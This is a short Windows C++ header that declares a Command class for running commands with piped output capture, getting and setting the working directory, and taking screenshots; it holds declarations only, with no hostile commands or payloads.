#pragma once
// windows api
#include <atlimage.h>
#include <gdiplus.h>
#include <synchapi.h>
#include <windows.h>
#pragma comment (lib,"Gdiplus.lib")

// standard
#include <iostream>
#include <string>
#include <filesystem>

class Command
{
	// TODO: refactor this class
	//       create method to return current path
private:
	std::vector<char> output;
	bool PipeToBuffer(HANDLE& h_OUT_RD);
	bool InitPipe(HANDLE& h_OUT_RD, HANDLE& h_OUT_WR);

public:
	Command() = default;
	bool Execute(std::string cmd);
	const std::string GetOutput() const;
	const std::string GetCurrentDir() const;
	const bool SetCurrentDir(std::string& path) const;
	void TakeScreenshot(std::vector<BYTE>& imageBytes);
};

